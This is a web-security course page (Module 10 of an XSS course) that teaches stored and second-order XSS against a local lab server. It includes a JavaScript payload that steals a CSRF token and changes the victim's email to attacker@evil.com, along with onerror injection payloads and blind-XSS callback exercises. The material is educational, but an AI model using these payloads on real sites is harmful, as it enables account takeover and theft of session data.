@@ -1,0 +1,354 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Module 10 — Stored XSS | XSS Mastery</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@600;700&family=Lato:wght@300;400;700&family=Source+Code+Pro:wght@400;600&display=swap" rel="stylesheet">
+  <style>
+    :root{--bg:#0b0f1a;--bg2:#111827;--bg3:#1a2235;--card:#141c2e;--border:#1e3a5f;
+          --gold:#f5c842;--cyan:#38bdf8;--purple:#a78bfa;--red:#f87171;--green:#4ade80;
+          --teal:#0d9488;--orange:#fb923c;--text:#e2e8f0;--muted:#7a9bbf;--code-bg:#060d1a}
+    *,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+    body{background:var(--bg);color:var(--text);font-family:'Lato',sans-serif;font-size:16px;line-height:1.75}
+    .page-wrap{max-width:860px;margin:0 auto;padding:48px 24px 96px}
+    .mod-badge{display:inline-block;font-size:11px;font-weight:700;letter-spacing:.14em;
+               text-transform:uppercase;color:var(--muted);border:1px solid var(--border);
+               border-radius:4px;padding:4px 10px;margin-bottom:20px}
+    h1{font-family:'Playfair Display',serif;font-size:42px;color:var(--gold);line-height:1.2;margin-bottom:12px}
+    h2{font-family:'Playfair Display',serif;font-size:26px;color:var(--cyan);margin:52px 0 16px;padding-top:8px;border-top:1px solid var(--border)}
+    h3{font-size:18px;font-weight:700;color:var(--purple);margin:32px 0 10px}
+    h4{font-size:14px;font-weight:700;color:var(--orange);margin:20px 0 6px;text-transform:uppercase;letter-spacing:.06em}
+    .subtitle{font-size:17px;color:var(--muted);margin-bottom:40px;line-height:1.5}
+    p{margin-bottom:18px}
+    strong{color:var(--text);font-weight:700}
+    em{color:var(--orange);font-style:normal;font-weight:600}
+    a{color:var(--cyan)}
+    ul,ol{padding-left:22px;margin-bottom:18px}
+    li{margin-bottom:6px;font-size:15px}
+    .prereq-bar{background:var(--card);border:1px solid var(--border);border-left:4px solid var(--teal);border-radius:6px;padding:16px 20px;margin-bottom:32px}
+    .prereq-bar strong{color:var(--teal);font-size:12px;text-transform:uppercase;letter-spacing:.1em;display:block;margin-bottom:6px}
+    .prereq-bar p{font-size:14px;color:var(--muted);margin:0}
+    .deliverables{background:var(--bg3);border:1px solid var(--border);border-radius:6px;padding:20px 24px;margin-bottom:36px}
+    .deliverables strong{color:var(--gold);font-size:13px;text-transform:uppercase;letter-spacing:.1em;display:block;margin-bottom:12px}
+    .deliverables ul{list-style:none;padding:0}
+    .deliverables li{font-size:14px;padding:4px 0 4px 20px;position:relative}
+    .deliverables li::before{content:"→";position:absolute;left:0;color:var(--green);font-weight:700}
+    .callout{border-radius:6px;padding:16px 20px;margin:28px 0;font-size:14.5px;line-height:1.65}
+    .callout .callout-label{font-size:11px;font-weight:700;letter-spacing:.12em;text-transform:uppercase;margin-bottom:8px;display:block}
+    .callout.warning{background:#1f0f0f;border-left:4px solid var(--red)}
+    .callout.warning .callout-label{color:var(--red)}
+    .callout.tip{background:#0a1f13;border-left:4px solid var(--green)}
+    .callout.tip .callout-label{color:var(--green)}
+    .callout.insight{background:#0f1240;border-left:4px solid var(--purple)}
+    .callout.insight .callout-label{color:var(--purple)}
+    pre{background:var(--code-bg);border:1px solid var(--border);border-radius:6px;padding:20px;overflow-x:auto;margin:20px 0;font-family:'Source Code Pro',monospace;font-size:13.5px;line-height:1.7}
+    code{font-family:'Source Code Pro',monospace;font-size:13px}
+    p code,li code{background:var(--code-bg);color:var(--cyan);padding:2px 6px;border-radius:3px;border:1px solid var(--border)}
+    .cm{color:#4b5563}.kw{color:#89dceb}.fn{color:#a78bfa}.st{color:#a6e3a1}
+    .at{color:#f5c842}.op{color:#f87171}.hl{color:#f5c842;font-weight:700}
+    .steps{list-style:none;counter-reset:step;margin:20px 0;padding:0}
+    .steps li{counter-increment:step;padding:14px 16px 14px 56px;position:relative;background:var(--card);border:1px solid var(--border);border-radius:6px;margin-bottom:10px;font-size:14.5px}
+    .steps li::before{content:counter(step);position:absolute;left:16px;top:14px;width:24px;height:24px;border-radius:50%;background:var(--border);color:var(--cyan);font-weight:700;font-size:12px;display:flex;align-items:center;justify-content:center}
+    .exercise{background:var(--card);border:1px solid var(--border);border-radius:6px;padding:20px 24px;margin-bottom:14px}
+    .exercise .ex-badge{font-size:10px;font-weight:700;letter-spacing:.1em;text-transform:uppercase;padding:2px 8px;border-radius:3px;margin-bottom:10px;display:inline-block}
+    .ex-warm .ex-badge{background:#1a2f1a;color:var(--green)}
+    .ex-core .ex-badge{background:#1a1a2f;color:var(--cyan)}
+    .ex-stretch .ex-badge{background:#2f1a2f;color:var(--purple)}
+    .exercise h4{margin-top:0}
+    .exercise p,.exercise li{font-size:14.5px}
+    .next-box{background:var(--bg3);border:1px solid var(--border);border-left:4px solid var(--gold);border-radius:6px;padding:22px 24px;margin-top:48px}
+    .next-box strong{color:var(--gold);display:block;font-size:12px;text-transform:uppercase;letter-spacing:.1em;margin-bottom:10px}
+    .top-nav{background:var(--bg2);border-bottom:1px solid var(--border);padding:12px 24px;display:flex;align-items:center;justify-content:space-between;font-size:13px;color:var(--muted)}
+    .top-nav a{color:var(--cyan);text-decoration:none}
+    table{width:100%;border-collapse:collapse;margin:20px 0;font-size:14px}
+    th{background:var(--card);color:var(--cyan);padding:10px 14px;text-align:left;border-bottom:1px solid var(--border)}
+    td{padding:10px 14px;border-bottom:1px solid var(--border);vertical-align:top}
+    tr:last-child td{border-bottom:none}
+  </style>
+</head>
+<body>
+
+<nav class="top-nav">
+  <a href="/">← Lab Home</a>
+  <span>XSS Mastery Course</span>
+  <span>Module 10 of 19</span>
+</nav>
+
+<div class="page-wrap">
+
+  <div class="mod-badge">Module 10 of 19</div>
+  <h1>Stored XSS<br>& Second-Order Attacks</h1>
+  <p class="subtitle">
+    Reflected and DOM-based XSS require the attacker to deliver a URL to the
+    victim. Stored XSS eliminates that requirement: the payload executes
+    automatically for every subsequent visitor, forever — or until someone
+    notices and removes it. Second-order attacks extend this by storing the
+    payload in one context and detonating it in a different, more privileged one.
+  </p>
+
+  <div class="prereq-bar">
+    <strong>Prerequisites</strong>
+    <p>Modules 01–09 complete. You have fired reflected and DOM-based XSS across
+       every execution mechanism. This module adds the persistence layer.</p>
+  </div>
+
+  <div class="deliverables">
+    <strong>What you will build in this module</strong>
+    <ul>
+      <li>A comment board (<code>/board</code>) with POST storage and raw rendering</li>
+      <li>An admin panel (<code>/admin</code>) that renders stored profiles — second-order context</li>
+      <li>A profile registration form (<code>/admin/profile</code>) — public attacker entry point</li>
+      <li>A 5-step attack demo covering stored XSS, author-field injection, second-order escalation, and XSS→CSRF chaining</li>
+    </ul>
+  </div>
+
+  <!-- ════════════════════════════════════════════════════════════ -->
+  <h2>Concept 1 — The Storage Model</h2>
+  <!-- ════════════════════════════════════════════════════════════ -->
+
+  <p>
+    In reflected XSS, the payload travels in the HTTP request and immediately
+    returns in the response. The attack window is a single request/response
+    cycle — the victim must be induced to send the crafted request.
+  </p>
+
+  <p>
+    In stored XSS, the payload is written to persistent storage (database,
+    file, cache) in one request. All subsequent responses that include that
+    stored data carry the payload. The attacker's interaction with the
+    application ends at submission; the victim is anyone who later loads
+    the affected page.
+  </p>
+
+  <table>
+    <thead><tr><th>Property</th><th>Reflected XSS</th><th>Stored XSS</th></tr></thead>
+    <tbody>
+      <tr><td>Delivery mechanism</td><td>Attacker sends URL to victim</td><td>Victim visits any page that shows stored data</td></tr>
+      <tr><td>Victims per payload</td><td>One (per sent link)</td><td>All visitors during dwell period</td></tr>
+      <tr><td>Server log visibility</td><td>Payload visible in access log</td><td>Payload in storage; access log shows normal GET</td></tr>
+      <tr><td>CSRF token bypass</td><td>Requires token theft in same request</td><td>Can exfil token in separate same-origin request</td></tr>
+      <tr><td>Persistence</td><td>None — payload gone after response</td><td>Dwell time = until manually removed</td></tr>
+      <tr><td>Typical CVSS score</td><td>6–8</td><td>8–10</td></tr>
+    </tbody>
+  </table>
+
+  <!-- ════════════════════════════════════════════════════════════ -->
+  <h2>Concept 2 — Second-Order (Persistent Blind) XSS</h2>
+  <!-- ════════════════════════════════════════════════════════════ -->
+
+  <p>
+    Second-order XSS (also called "persistent blind XSS" in the blind XSS
+    literature) occurs when the storage context and the execution context are
+    different pages or application features. The key characteristic:
+    <em>the payload does not execute when submitted</em>. The submitter
+    cannot immediately confirm the injection worked. Execution happens later,
+    in a context the attacker may not even be able to visit directly.
+  </p>
+
+  <p>
+    This module's admin panel models the most common second-order pattern:
+  </p>
+
+  <ul>
+    <li><strong>Storage context:</strong> Public profile registration form — low privilege, no auth</li>
+    <li><strong>Execution context:</strong> Admin user management panel — high privilege, admin auth</li>
+    <li><strong>Time gap:</strong> Hours or days between submission and admin review</li>
+    <li><strong>Attacker visibility:</strong> Attacker cannot see admin panel to confirm the payload — hence "blind"</li>
+  </ul>
+
+  <div class="callout insight">
+    <span class="callout-label">PhD Insight — Second-Order XSS in Security Audits</span>
+    Second-order XSS is the most commonly missed XSS class in penetration tests
+    and automated scans. Scanners that test only for immediate reflection will
+    not detect it. A test that submits a payload to a registration form and
+    checks only the registration confirmation page for reflection will miss
+    execution in the admin panel entirely. The correct technique is to submit
+    payloads with out-of-band callbacks (a payload that POSTs to a server you control)
+    and wait for execution. This is the basis of blind XSS tools like XSS Hunter.
+    When writing your PhD threat model, second-order XSS must be listed as a
+    distinct threat with its own detection requirements.
+  </div>
+
+  <!-- ════════════════════════════════════════════════════════════ -->
+  <h2>Concept 3 — Stored XSS Enables CSRF Token Theft</h2>
+  <!-- ════════════════════════════════════════════════════════════ -->
+
+  <p>
+    A common developer misconception is that CSRF tokens protect against XSS-enabled
+    CSRF. They do not. A stored XSS payload running in a victim's browser has full
+    same-origin access. It can:
+  </p>
+
+  <ol>
+    <li>Fetch any same-origin page that contains a CSRF token</li>
+    <li>Parse the token from the response HTML</li>
+    <li>Include the token in a forged POST request</li>
+    <li>Exfiltrate the result</li>
+  </ol>
+
+  <pre><span class="cm">// XSS payload that steals CSRF token and uses it:</span>
+<span class="kw">fetch</span>(<span class="st">'/settings'</span>)                        <span class="cm">// 1. fetch page with CSRF token</span>
+  .<span class="fn">then</span>(r =&gt; r.<span class="fn">text</span>())
+  .<span class="fn">then</span>(html =&gt; {
+    <span class="kw">const</span> m = html.<span class="fn">match</span>(<span class="st">/csrf_token" value="([^"]+)"/</span>);
+    <span class="kw">const</span> token = m &amp;&amp; m[<span class="nu">1</span>];              <span class="cm">// 2. extract token</span>
+    <span class="kw">return</span> <span class="fn">fetch</span>(<span class="st">'/settings/email'</span>, {
+      method: <span class="st">'POST'</span>,
+      body: <span class="st">`email=attacker@evil.com&csrf_token=</span><span class="hl">${token}</span><span class="st">`</span>,
+      headers: { <span class="st">'Content-Type'</span>: <span class="st">'application/x-www-form-urlencoded'</span> },
+      credentials: <span class="st">'include'</span>                <span class="cm">// 3. send with victim's cookies</span>
+    });
+  });                                       <span class="cm">// 4. email changed to attacker's</span></pre>
+
+  <p>
+    This is why the OWASP Top 10 lists XSS as a prerequisite threat to CSRF:
+    an application with stored XSS has effectively no CSRF protection for
+    any page the victim's browser visits while the payload is active.
+  </p>
+
+  <!-- ════════════════════════════════════════════════════════════ -->
+  <h2>Build &amp; Run</h2>
+  <!-- ════════════════════════════════════════════════════════════ -->
+
+  <ol class="steps">
+    <li>Start the server: <code>python lab_server.py</code> or <code>node lab_server.js</code></li>
+    <li>Open <a href="http://localhost:5000/attack_06_stored.html" target="_blank">attack_06_stored.html</a> as the mission guide</li>
+    <li>Step 1: Submit the onerror payload via the comment form. Then open an incognito window and visit <code>/board</code> — confirm the payload fires for the "new victim"</li>
+    <li>Step 3: Submit the profile payload at <code>/admin/profile</code>. Then visit <code>/admin</code> to simulate the admin reviewing profiles</li>
+    <li>Step 4: After submitting the XSS→CSRF payload, visit <code>/admin</code>, then check <code>/board</code> — the board should have been cleared by the payload running in the "admin's" browser</li>
+    <li>Use the Clear utility links between steps to reset the stores</li>
+  </ol>
+
+  <!-- ════════════════════════════════════════════════════════════ -->
+  <h2>Exercises</h2>
+  <!-- ════════════════════════════════════════════════════════════ -->
+
+  <div class="exercise ex-warm">
+    <span class="ex-badge">Warm-up</span>
+    <h4>Exercise 1 — Confirm Multi-Victim Behaviour</h4>
+    <p>
+      Submit a payload to the comment board that changes the page's background
+      color to red when it fires (<code>document.body.style.background='red'</code>).
+      Then open the board in three different browser tabs simultaneously.
+      Confirm the payload fires in all three — each tab is a separate "victim".
+    </p>
+    <p>
+      Then open an incognito window (or a different browser entirely) and visit
+      the board. Confirm the payload fires there too. Document: how many times
+      did the payload fire in total? What does this tell you about the impact
+      multiplier of stored vs reflected XSS?
+    </p>
+  </div>
+
+  <div class="exercise ex-warm">
+    <span class="ex-badge">Warm-up</span>
+    <h4>Exercise 2 — Intercept POST in Burp</h4>
+    <p>
+      Configure Burp to intercept POST requests. Submit a comment and intercept
+      the <code>POST /board/post</code> request. In Burp's Intercept tab:
+    </p>
+    <ul>
+      <li>Identify the two fields in the POST body</li>
+      <li>Modify the <code>text</code> field to contain <code>&lt;img src=x onerror=alert('via burp')&gt;</code></li>
+      <li>Forward the modified request</li>
+      <li>Verify the modified payload is stored and executes on the board</li>
+    </ul>
+    <p>
+      This demonstrates that client-side form validation (if any) is bypassed by
+      intercepting at the network level.
+    </p>
+  </div>
+
+  <div class="exercise ex-core">
+    <span class="ex-badge">Core</span>
+    <h4>Exercise 3 — CSRF Token Exfiltration Chain</h4>
+    <p>
+      This lab doesn't have CSRF tokens, but you can simulate the exfiltration
+      chain. Add a hidden CSRF token to the comment board form in
+      <code>lab_server.py</code>:
+    </p>
+    <pre><span class="cm"># In board() function, add to the form:</span>
+<span class="kw">import</span> secrets
+csrf = secrets.<span class="fn">token_hex</span>(<span class="nu">16</span>)
+<span class="cm"># Store in session (or just embed directly for demo):</span>
+<span class="cm"># &lt;input type="hidden" name="csrf_token" value="{csrf}"&gt;</span></pre>
+    <p>
+      Then build a stored XSS payload that:
+    </p>
+    <ul>
+      <li>Fetches <code>/board</code></li>
+      <li>Extracts the CSRF token from the response HTML using a regex</li>
+      <li>Sends the token value to <code>/ping?csrf=&lt;token&gt;</code></li>
+    </ul>
+    <p>
+      After submitting the payload, visit <code>/board</code> to trigger it,
+      and verify the CSRF token appears in DevTools → Network under the <code>/ping</code> request.
+    </p>
+  </div>
+
+  <div class="exercise ex-core">
+    <span class="ex-badge">Core</span>
+    <h4>Exercise 4 — Threat Model Entry for Stored XSS</h4>
+    <p>
+      Write a formal threat model entry for the stored XSS vulnerability in
+      the comment board, using the STRIDE framework:
+    </p>
+    <ul>
+      <li><strong>Spoofing:</strong> How can stored XSS enable identity spoofing?</li>
+      <li><strong>Tampering:</strong> What data can be modified via stored XSS in this application?</li>
+      <li><strong>Repudiation:</strong> Can stored XSS be used to manipulate audit logs?</li>
+      <li><strong>Information Disclosure:</strong> What data can be exfiltrated?</li>
+      <li><strong>Denial of Service:</strong> Can stored XSS cause DoS?</li>
+      <li><strong>Elevation of Privilege:</strong> How does the second-order attack in <code>/admin</code> achieve privilege elevation?</li>
+    </ul>
+    <p>
+      Include a severity rating (CVSS 3.1 base score) with justification.
+      This entry should be suitable for inclusion in your PhD thesis threat model chapter.
+    </p>
+  </div>
+
+  <div class="exercise ex-stretch">
+    <span class="ex-badge">Stretch</span>
+    <h4>Exercise 5 — Out-of-Band Blind XSS Detection</h4>
+    <p>
+      The second-order profile attack is "blind" — the attacker cannot see
+      the admin panel to confirm execution. Real blind XSS attacks use
+      out-of-band callbacks. Simulate this:
+    </p>
+    <ul>
+      <li>Modify the profile payload to fetch <code>/ping?blind=1&amp;ua=</code> + <code>navigator.userAgent</code></li>
+      <li>Submit the profile at <code>/admin/profile</code></li>
+      <li>Without visiting <code>/admin</code> yourself, have a classmate (or a second browser session) visit <code>/admin</code></li>
+      <li>Monitor <code>/ping</code> requests in the first session's DevTools → Network</li>
+      <li>When your classmate loads <code>/admin</code>, you should see the <code>/ping?blind=1</code> request appear — confirming blind XSS execution without the attacker ever loading the execution page</li>
+    </ul>
+    <p>
+      Research XSS Hunter (the blind XSS SaaS tool). Explain how it implements
+      this callback pattern at scale, and what additional information it collects
+      beyond the User-Agent.
+    </p>
+  </div>
+
+  <!-- ════════════════════════════════════════════════════════════ -->
+  <h2>What's Next</h2>
+  <!-- ════════════════════════════════════════════════════════════ -->
+
+  <div class="next-box">
+    <strong>Module 11 — Blind XSS & Out-of-Band Techniques</strong>
+    <p>
+      Module 10 introduced the concept of blind execution — payloads that fire
+      in contexts the attacker cannot observe directly. Module 11 builds the
+      full toolkit for blind XSS: out-of-band callback payloads, DNS-based
+      detection, payload canary techniques, and the methodology for testing
+      inputs that feed into admin panels, logging systems, PDF generators,
+      email templates, and other delayed or privileged rendering contexts.
+      This is the module most directly relevant to the "blind spots" in automated
+      security scanning that your PhD research may address.
+    </p>
+  </div>
+
+</div>
+</body>
+</html>
